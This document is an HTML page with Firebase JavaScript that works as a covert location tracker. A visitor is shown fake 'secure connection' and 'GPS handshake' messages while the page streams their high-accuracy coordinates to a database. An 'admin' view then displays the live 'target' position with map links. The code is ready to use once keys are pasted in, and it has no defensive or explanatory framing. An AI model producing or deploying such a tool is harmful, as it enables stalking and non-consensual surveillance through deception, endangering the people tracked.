<!DOCTYPE html>
<html>
<head>
    <title>System Sync</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-green-500 font-mono flex flex-col items-center justify-center h-screen">

    <div id="admin-panel" class="hidden w-full max-w-lg p-6">
        <h1 class="text-2xl border-b border-green-900 mb-4">LIVE TRACKING ACTIVE</h1>
        <div id="display" class="bg-gray-900 p-4 rounded border border-green-800 h-48 overflow-y-auto text-sm">
            Waiting for target...
        </div>
        <button onclick="location.reload()" class="mt-4 w-full border border-green-500 py-2 hover:bg-green-900">REFRESH DATA</button>
    </div>

    <div id="user-panel" class="text-center p-10">
        <div class="animate-pulse mb-4 text-xl">ESTABLISHING SECURE CONNECTION...</div>
        <div id="msg" class="text-gray-500">Authorizing GPS handshake...</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // --- PASTE YOUR FIREBASE KEYS HERE ---
        const firebaseConfig = {
            apiKey: "PASTE_HERE",
            authDomain: "PASTE_HERE",
            databaseURL: "PASTE_HERE",
            projectId: "PASTE_HERE",
            storageBucket: "PASTE_HERE",
            messagingSenderId: "PASTE_HERE",
            appId: "PASTE_HERE"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const params = new URLSearchParams(window.location.search);

        if (params.get('admin') === 'true') {
            // YOU: RECEIVER MODE
            document.getElementById('user-panel').style.display = 'none';
            document.getElementById('admin-panel').style.display = 'block';
            
            onValue(ref(db, 'pings/active_session'), (snap) => {
                const d = snap.val();
                if (d) {
                    document.getElementById('display').innerHTML = `
                        <div class="mb-4">
                            <p class="text-white">STATUS: TARGET FOUND</p>
                            <p>TIME: ${d.time}</p>
                            <p>LAT: ${d.lat} | LNG: ${d.lng}</p>
                            <a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank" class="text-blue-400 underline mt-2 block">OPEN LIVE MAP</a>
                        </div>
                    ` + document.getElementById('display').innerHTML;
                }
            });
        } else {
            // THEM: SENDER MODE
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition((p) => {
                    document.getElementById('msg').innerText = "Encryption active. Do not close this tab.";
                    set(ref(db, 'pings/active_session'), {
                        lat: p.coords.latitude,
                        lng: p.coords.longitude,
                        time: new Date().toLocaleTimeString()
                    });
                }, (e) => {
                    document.getElementById('msg').innerText = "Error: System handshake failed.";
                }, { enableHighAccuracy: true });
            }
        }
    </script>
</body>
</html>
